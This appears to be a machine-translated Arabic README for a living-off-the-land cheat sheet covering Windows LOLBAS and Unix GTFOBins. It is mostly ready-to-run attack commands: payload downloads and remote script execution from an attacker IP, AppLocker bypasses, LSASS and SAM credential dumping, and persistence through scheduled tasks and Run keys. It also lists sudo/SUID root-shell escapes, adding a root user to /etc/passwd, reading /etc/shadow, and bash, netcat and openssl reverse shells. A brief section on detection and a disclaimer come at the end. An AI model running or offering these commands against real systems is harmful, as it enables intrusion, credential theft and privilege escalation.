<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏹 العيش خارج الأرض (LOLBAS وGTFOBins) - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
  ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
  ██║     ██║   ██║██║     ██████╔╝███████║███████╗   ██║  ███╗   ██║   █████╗  ██║   ██║
  ██║     ██║   ██║██║     ██╔══██╗██╔══██║╚════██║   ██║   ██║   ██║   ██╔══╝  ██║   ██║
  ███████╗╚██████╔╝███████╗██████╔╝██║  ██║███████║██╗╚██████╔╝   ██║   ██║     ╚██████╔╝
  ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                 Living Off The Land (Windows LOLBAS & Unix GTFOBins)
```
<p align="center">
  <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
  <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="التهرب من الدفاع">
  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="العيش خارج الأرض">
</ص>

<p align="center">
  <b>🛠️ مرجع شامل لإساءة استخدام ثنائيات النظام الشرعية المثبتة مسبقًا لتنفيذ التعليمات البرمجية وتنزيل الحمولات وتصعيد الامتيازات</b>
</ص>

---

## 📋 جدول المحتويات

- [المقدمة](#-المقدمة)
- [لماذا نعيش خارج الأرض؟](#-لماذا نعيش خارج الأرض)
- [الجزء الأول: Windows LOLBAS](#-part-1-windows-lolbas)
  - [تنزيل الملف وإدخاله](#file-download--ingress)
  - [تنفيذ التعليمات البرمجية وتجاوز AppLocker](#code-execution--applocker-bypass)
  - [إلقاء بيانات الاعتماد (LSASS، SAM، LSA)](#credential-dumping-lsass-sam-lsa)
  - [الاستطلاع والاكتشاف](#الاستطلاع--الاكتشاف)
  - [المثابرة والمهام المجدولة](#المثابرة--المهام المجدولة)
- [الجزء 2: Unix / Linux GTFOBins](#-part-2-unix--linux-gtfobins)
  - [SUID وSudo Shell Escapes](#suid--sudo-shell-escapes)
  - [استغلال قراءة وكتابة الملفات](#file-read--write-exploitation)
  - [دخول الشبكة والأصداف العكسية](#network-ingress--reverse-shells)
  - [مترجمو GTFObins عالي التأثير](#gtfobins-high-impact-interpreters)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية والكشف](#-الاعتبارات الدفاعية--الكشف)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)
- [الموارد](#-الموارد)

---

## 🎯 المقدمة

**العيش خارج الأرض (LotL)** عبارة عن حرفة تجارية لمرحلة ما بعد الاستغلال حيث يستخدم المهاجمون وأعضاء الفريق الأحمر حصريًا ثنائيات النظام الشرعية والمدمجة والموثوقة والبرامج النصية والمكتبات الموجودة بالفعل على نظام التشغيل.

- **LOLBAS (Windows):** العيش خارج الأرض الثنائيات والبرامج النصية والمكتبات.
- **GTFOBins (Unix/Linux):** مجموعة منسقة من ثنائيات Unix التي يمكن إساءة استخدامها لتجاوز قيود الأمان المحلية، والهروب من الأصداف المقيدة، وتصعيد الامتيازات.

---

## ⚖️ لماذا نعيش خارج الأرض؟

1. 🛡️ **تجاوز القائمة البيضاء للتطبيقات:** يتم توقيع الثنائيات مثل `certutil.exe` أو `rundll32.exe` أو `find` رقميًا بواسطة بائعي Microsoft أو نظام التشغيل ويثق بها AppLocker وWDAC وSELinux.
2. 👁️ **التهرب من AV/EDR المستند إلى التوقيع:** لا يتم إسقاط أي ملف ضار أجنبي قابل للتنفيذ (`.exe`، `.elf`) على القرص.
3. 📉 **بصمة تشغيلية منخفضة:** يقلل من حالات الشذوذ في الطب الشرعي في السجل من خلال استخدام أدوات الإدارة الأصلية.

---

## 🪟 الجزء الأول: Windows LOLBAS

### تنزيل الملف وإدخاله

#### 1.Certutil.exe
```cmd
:: Download file and decode from base64
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe

:: Base64 encode and decode local files
certutil.exe -encode payload.exe encoded.txt
certutil.exe -decode encoded.txt payload.exe
```
#### 2. Bitsadmin.exe
```cmd
:: Asynchronous background download
bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```
#### 3.Curl.exe وPowerShell
```powershell
:: Built-in curl (Windows 10+)
curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe

:: PowerShell download string
powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
```
---

### تنفيذ التعليمات البرمجية وتجاوز AppLocker

#### 1. Mshta.exe (تنفيذ HTA/VBScript عن بعد)
```cmd
:: Execute malicious HTA script directly from remote URL (bypasses AppLocker)
mshta.exe http://10.10.14.5/payload.hta

:: Inline VBScript execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
```
#### 2. Regsvr32.exe (تقنية Squilydoo)
```cmd
:: Executes remote scriptlet (.sct) via COM without touching disk
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```
#### 3. Rundll32.exe
```cmd
:: Execute exported DLL function
rundll32.exe payload.dll,EntryPoint

:: Execute JavaScript in memory
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
```
#### 4. Wmic.exe (تنفيذ برنامج XSL النصي)
```cmd
:: Execute arbitrary code via XSL stylesheet
wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
```
#### 5.Instalutil.exe
```cmd
:: Execute unmanaged code inside signed .NET installer (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
```
---

### تفريغ بيانات الاعتماد (LSASS، SAM، LSA)

#### 1. Rundll32.exe + Comsvcs.dll (تفريغ LSASS)
تفريغ ذاكرة عملية LSASS دون إسقاط Mimikatz:
```powershell
# Find LSASS Process ID
$lsassPid = (Get-Process lsass).Id

# Create minidump using built-in comsvcs.dll (Requires Administrator)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
```
#### 2. Reg.exe (حفظ SAM، والنظام، وخلايا الأمان)
```cmd
:: Dump local credential hives for offline extraction
reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
```
---

### الاستطلاع والاكتشاف
```cmd
:: Find internal domain controllers
nltest /dclist:domain.local

:: List domain trust relationships
nltest /domain_trusts

:: Query Active Directory computers and users without RSAT
dsquery computer
dsquery user -name *admin*

:: Check active network connections with process IDs
netstat -ano
```
---

### المثابرة والمهام المجدولة
```cmd
:: Create scheduled task running every 15 minutes as SYSTEM
schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"

:: Add Registry Run Key for current user
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```
---

## 🐧 الجزء الثاني: ملفات GTFOBins لنظام التشغيل Unix/Linux

### هروب SUID وSudo Shell

عندما يحتوي الثنائي على مجموعة SUID (`chmod u+s`) أو يتم منحه في `sudo -l`، قم بإساءة استخدامه للحصول على غلاف جذر فوري:

#### 1. سودو / SUID `find`
```bash
# SUID
find . -exec /bin/sh -p \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit
```
#### 2. سودو / SUID `vim` / `vi`
```bash
# Escape from inside vim
:!/bin/sh

# One-liner execution
vim -c ':!/bin/sh'
```
#### 3. سودو / SUID `awk`
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
#### 4. سودو / SUID `tar`
```bash
# Checkpoint command execution
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
#### 5. سودو / SUID `nano`
```bash
# Inside nano: Press Ctrl+R, then Ctrl+X, then type:
reset; sh 1>&0 2>&0
```
#### 6. سودو / SUID `env`
```bash
# SUID
env /bin/sh -p

# Sudo
sudo env /bin/sh
```
#### 7. سودو `less` / `more` / `man`
```bash
# Inside pager: Type !/bin/sh and press Enter
!/bin/sh
```
---

### استغلال قراءة وكتابة الملفات

عندما لا تتمكن من إنتاج الصدفة مباشرة، استخدم أدوات قراءة/كتابة الملفات للكتابة فوق `/etc/passwd` أو قراءة `/etc/shadow`:

#### الكتابة فوق `/etc/passwd` عبر Sudo/SUID `tee`
```bash
# Generate password hash: openssl passwd -1 -salt evil P@ss123
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```
#### قراءة الملفات الحساسة عبر ثنائيات SUID
```bash
# Base64
base64 /etc/shadow | base64 --decode

# Xxd
xxd /etc/shadow | xxd -r

# Head / Tail
head -n 100 /etc/shadow
```
---

### دخول الشبكة والأصداف العكسية

نقل الملفات والأصداف المنبثقة بدون `curl` أو `wget`:

#### 1. Bash Native TCP Reverse Shell
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```
#### 2. Netcat الأصلي (بدون علامة `-e`)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```
#### 3. OpenSSL Reverse Shell
على المهاجم:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
على الهدف:
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```
---

### المترجمون الفوريون ذوو التأثير العالي لـ GTFOBins

إذا تم منح المترجمين الفوريين Sudo / SUID:
```bash
# Python
sudo python3 -c 'import os; os.system("/bin/sh")'

# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# PHP
sudo php -r "system('/bin/sh');"

# Lua
sudo lua -e 'os.execute("/bin/sh")'
```
---

## 📊 جدول مرجعي سريع

| نظام التشغيل | ثنائي | الغرض | أمر الإساءة |
|----|--------|---------|---------------|
| **فوز** | `certutil.exe` | تحميل الملف | `certutil -urlcache -split -f http://<IP>/file out.exe` |
| **فوز** | `mshta.exe` | البعيد HTA إكسيك | `mshta http://<IP>/payload.hta` |
| **فوز** | `regsvr32.exe` | البرنامج النصي إكسيك | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
| **فوز** | `rundll32.exe` | تفريغ LSASS | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
| **يونكس**| `find` | SUID شل | `find . -exec /bin/sh -p \; -quit` |
| **يونكس**| `awk` | سودو شل | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| **يونكس**| `vim` | شل الهروب | `vim -c ':!/bin/sh'` |
| **يونكس**| `tee` | الكتابة فوق الملف | `echo "root2:..." \| sudo tee -a /etc/passwd` |

---

## 🛡️ الاعتبارات الدفاعية والكشوفات

1. **تدقيق تسجيل سطر الأوامر:**
   قم بتمكين **Sysmon (معرف الحدث 1)** وتسجيل إنشاء العمليات في Windows (معرف الحدث 4688) مع تدقيق سطر الأوامر لمراقبة الوسائط الشاذة التي تم تمريرها إلى `certutil` و`mshta` و`rundll32`.
2. **حظر العلاقات الضارة بين الوالدين والطفل:**
   مراقبة ظهور `mshta.exe` أو `regsvr32.exe` على `cmd.exe` أو `powershell.exe`.
3. **تقييد توجيهات سودو:**
   تجنب أحرف البدل (`*`) في `/etc/sudoers`. لا تسمح أبدًا للمستخدمين بتشغيل برامج تحرير النصوص (`vim`، `nano`) أو المترجمات كجذر.

---

## ⚠️إخلاء المسؤولية القانونية

> **هام:** تسيء أساليب العيش خارج الأرض إلى استخدام المرافق الإدارية الموثوقة. ورقة الغش هذه مخصصة حصريًا للتقييمات الأمنية المعتمدة والتصلب الدفاعي والدراسة التعليمية.

---

## 📚 المصادر

- [المستودع الرسمي لمشروع LOLBAS](https://lolbas-project.github.io/)
- [مستودع GTFOBins الرسمي](https://gtfobins.github.io/)
- [MITRE ATT&CK: تخريب ضوابط الثقة (T1564)](https://attack.mitre.org/techniques/T1564/)